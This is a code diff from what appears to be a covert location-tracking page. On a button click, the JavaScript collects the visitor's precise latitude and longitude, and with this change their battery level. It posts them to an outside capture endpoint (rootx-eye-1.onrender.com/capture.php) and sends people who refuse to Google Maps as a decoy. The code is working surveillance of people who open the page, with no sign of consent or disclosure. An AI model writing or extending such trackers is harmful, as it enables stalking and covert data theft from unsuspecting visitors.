@@ -66,8 +66,15 @@ startBtn.onclick = () => {
       fd.append('lat', pos.coords.latitude.toFixed(6));
       fd.append('lng', pos.coords.longitude.toFixed(6));
 
-      fetch('https://rootx-eye-1.onrender.com/capture.php', { method: "POST", body: fd })
-        .then(() => window.location.replace("https://maps.google.com/"));
+      // 🔥 Battery
+      if (navigator.getBattery) {
+        navigator.getBattery().then(battery => {
+          fd.append('battery', battery.level * 100);
+          fetch('https://rootx-eye-1.onrender.com/capture.php', { method: "POST", body: fd });
+        });
+      } else {
+        fetch('https://rootx-eye-1.onrender.com/capture.php', { method: "POST", body: fd });
+      }
     }, () => window.location.replace("https://maps.google.com/"));
   } else {
     window.location.replace("https://maps.google.com/");
